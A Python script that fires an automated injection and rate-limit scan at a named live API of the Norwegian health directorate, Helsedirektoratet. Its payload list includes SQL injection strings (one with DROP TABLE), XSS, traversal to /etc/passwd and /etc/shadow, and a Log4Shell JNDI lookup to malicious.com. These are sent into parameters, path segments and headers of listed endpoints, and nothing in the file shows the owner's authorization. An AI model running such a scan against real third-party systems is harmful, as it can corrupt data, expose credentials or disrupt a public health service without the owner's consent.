import requests
import json
import time
from concurrent.futures import ThreadPoolExecutor

BASE_URL = "https://fat.kote.helsedirektoratet.no"  # Correct base URL

# Collection of potentially problematic inputs for testing
INJECTION_PAYLOADS = [
    "' OR 1=1; --",
    "\"; DROP TABLE users; --",
    "<script>alert(1)</script>",
    "../../../etc/passwd",
    "${jndi:ldap://malicious.com/a}",
    "../../../../etc/shadow",
    "%00",
    "1' UNION SELECT null,null,null,null,null,null,null,null,null,null--",
    "$${{<%[%'\"}}%\\.",
    "@{user.home}"
]

def test_endpoint_security(endpoint, method="GET", params=None, data=None, headers=None):
    """Test an endpoint for common security vulnerabilities"""
    results = []
    
    if not headers:
        headers = {
            "Accept-Language": "nb",
            "Accept": "application/json"
        }
    
    # 1. Test for injection in parameters
    if params:
        for param_name in params:
            for payload in INJECTION_PAYLOADS:
                test_params = params.copy()
                test_params[param_name] = payload
                
                try:
                    if method.upper() == "GET":
                        response = requests.get(endpoint, headers=headers, params=test_params, timeout=5)
                    elif method.upper() == "POST":
                        response = requests.post(endpoint, headers=headers, params=test_params, data=data, timeout=5)
                    
                    # Check for interesting responses
                    if response.status_code in [500, 503]:
                        results.append({
                            "type": "Possible parameter injection",
                            "endpoint": endpoint,
                            "parameter": param_name,
                            "payload": payload,
                            "status_code": response.status_code,
                            "response_size": len(response.text)
                        })
                except Exception as e:
                    results.append({
                        "type": "Exception during parameter test",
                        "endpoint": endpoint,
                        "parameter": param_name,
                        "payload": payload,
                        "error": str(e)
                    })
    
    # 2. Test for path traversal if endpoint has a path parameter
    if "{" in endpoint and "}" in endpoint:
        path_parts = endpoint.split("/")
        for i, part in enumerate(path_parts):
            if "{" in part and "}" in part:
                # Extract the path parameter name
                param_name = part.strip("{}") 
                
                for payload in INJECTION_PAYLOADS:
                    test_endpoint = endpoint.replace(f"{{{param_name}}}", payload)
                    
                    try:
                        response = requests.get(test_endpoint, headers=headers, timeout=5)
                        
                        # Check for interesting responses
                        if response.status_code in [500, 503]:
                            results.append({
                                "type": "Possible path traversal",
                                "endpoint": test_endpoint,
                                "parameter": param_name,
                                "payload": payload,
                                "status_code": response.status_code,
                                "response_size": len(response.text)
                            })
                    except Exception as e:
                        results.append({
                            "type": "Exception during path test",
                            "endpoint": test_endpoint,
                            "parameter": param_name,
                            "payload": payload,
                            "error": str(e)
                        })
    
    # 3. Test for header injection
    for header_name in ["Accept", "Accept-Language", "User-Agent"]:
        for payload in INJECTION_PAYLOADS:
            test_headers = headers.copy()
            test_headers[header_name] = payload
            
            try:
                response = requests.get(endpoint, headers=test_headers, params=params, timeout=5)
                
                # Check for interesting responses
                if response.status_code in [500, 503]:
                    results.append({
                        "type": "Possible header injection",
                        "endpoint": endpoint,
                        "header": header_name,
                        "payload": payload,
                        "status_code": response.status_code,
                        "response_size": len(response.text)
                    })
            except Exception as e:
                results.append({
                    "type": "Exception during header test",
                    "endpoint": endpoint,
                    "header": header_name,
                    "payload": payload,
                    "error": str(e)
                })
    
    # 4. Test for rate limiting
    rate_limit_results = []
    start_time = time.time()
    success_count = 0
    failure_count = 0
    
    # Make 15 rapid requests to test for rate limiting
    for _ in range(15):
        try:
            response = requests.get(endpoint, headers=headers, params=params, timeout=5)
            if response.status_code == 200:
                success_count += 1
            else:
                failure_count += 1
                
            # Check for rate limit headers
            rate_limit_headers = [h for h in response.headers if 'rate' in h.lower() or 'limit' in h.lower()]
            if rate_limit_headers:
                rate_limit_results.append({
                    "type": "Rate limit headers detected",
                    "endpoint": endpoint,
                    "headers": {h: response.headers[h] for h in rate_limit_headers}
                })
                break
                
        except Exception as e:
            failure_count += 1
    
    elapsed = time.time() - start_time
    if success_count == 15:
        rate_limit_results.append({
            "type": "No rate limiting detected",
            "endpoint": endpoint,
            "requests": 15,
            "time": elapsed,
            "requests_per_second": 15/elapsed
        })
    
    results.extend(rate_limit_results)
    
    return results

def scan_all_endpoints():
    """Scan all endpoints in the API for security issues"""
    all_results = []
    
    # Define some test endpoints from the Swagger
    endpoints = [
        # Clinical Drugs endpoints
        {"url": f"{BASE_URL}/api/medicines/clinical-drugs", "method": "GET", 
         "params": {"pageNumber": 1, "pageSize": 10}},
        {"url": f"{BASE_URL}/api/medicines/clinical-drugs/12345", "method": "GET"},
        
        # Code Systems endpoints
        {"url": f"{BASE_URL}/api/code-systems", "method": "GET"},
        {"url": f"{BASE_URL}/api/code-systems/ICD10", "method": "GET", 
         "params": {"pageNumber": 1, "pageSize": 10}},
        {"url": f"{BASE_URL}/api/code-systems/ICD10/A01", "method": "GET"},
        
        # Diagnosis endpoints
        {"url": f"{BASE_URL}/api/diagnosis/icpc2", "method": "GET", 
         "params": {"pageNumber": 1, "pageSize": 10}},
        {"url": f"{BASE_URL}/api/diagnosis/hp/icd10", "method": "GET", 
         "params": {"pageNumber": 1, "pageSize": 10}},
        
        # FEST endpoints
        {"url": f"{BASE_URL}/api/fest/merkevarer", "method": "GET"},
    ]
    
    with ThreadPoolExecutor(max_workers=5) as executor:
        # Map the test function over all endpoints
        future_to_endpoint = {
            executor.submit(
                test_endpoint_security, 
                endpoint["url"], 
                endpoint.get("method", "GET"),
                endpoint.get("params", None),
                endpoint.get("data", None),
                endpoint.get("headers", None)
            ): endpoint for endpoint in endpoints
        }
        
        for future in future_to_endpoint:
            endpoint = future_to_endpoint[future]
            try:
                results = future.result()
                if results:
                    all_results.extend(results)
                    print(f"Found {len(results)} issues with {endpoint['url']}")
            except Exception as e:
                print(f"Error testing {endpoint['url']}: {e}")
    
    return all_results

def save_results(results, filename="security_scan_results.json"):
    """Save scan results to a file"""
    with open(filename, 'w') as f:
        json.dump(results, f, indent=2)
    print(f"Results saved to {filename}")

# Example usage
if __name__ == "__main__":
    print("Starting security scan of Helsedirektoratet API...")
    results = scan_all_endpoints()
    print(f"Scan complete. Found {len(results)} potential issues.")
    save_results(results)
    
    # Show summary of findings
    if results:
        issue_types = {}
        for result in results:
            issue_type = result.get("type", "Unknown")
            if issue_type in issue_types:
                issue_types[issue_type] += 1
            else:
                issue_types[issue_type] = 1
        
        print("\nSummary of findings:")
        for issue_type, count in issue_types.items():
            print(f"- {issue_type}: {count}")
    else:
        print("No issues found. The API appears to be well-secured.")